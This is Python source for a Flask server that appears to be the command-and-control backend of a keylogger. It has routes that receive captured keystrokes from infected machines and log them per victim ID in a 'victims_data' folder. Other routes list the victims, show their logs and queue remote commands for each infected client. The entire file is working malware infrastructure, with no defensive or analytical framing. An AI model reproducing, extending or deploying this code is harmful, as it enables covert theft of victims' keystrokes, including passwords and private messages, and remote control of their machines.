from flask import Flask, request, jsonify, render_template
import os
import datetime

app = Flask(__name__)

LOG_DIR = "victims_data"
if not os.path.exists(LOG_DIR): os.makedirs(LOG_DIR)

PENDING_COMMANDS = {}

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    uuid = data.get('uuid')
    keys = data.get('keys')
    
    # Stockage des logs seulement si non vide
    if uuid and keys:
        timestamp = datetime.datetime.now().strftime("[%H:%M:%S]")
        with open(f"{LOG_DIR}/{uuid}.log", "a") as f:
            f.write(f"{timestamp} {keys}\n")
    
    # Renvoi de la commande en attente
    cmd = PENDING_COMMANDS.get(uuid, "start")
    return jsonify({"status": "ok", "command": cmd})

@app.route('/api/victims')
def list_victims():
    if not os.path.exists(LOG_DIR): return jsonify([])
    files = [f.replace('.log','') for f in os.listdir(LOG_DIR) if f.endswith('.log')]
    return jsonify(files)

@app.route('/api/logs/<uuid>')
def get_logs(uuid):
    try:
        with open(f"{LOG_DIR}/{uuid}.log", 'r') as f:
            return jsonify({"logs": f.read()})
    except:
        return jsonify({"logs": ""})

@app.route('/api/command', methods=['POST'])
def set_command():
    data = request.json
    PENDING_COMMANDS[data['uuid']] = data['command']
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
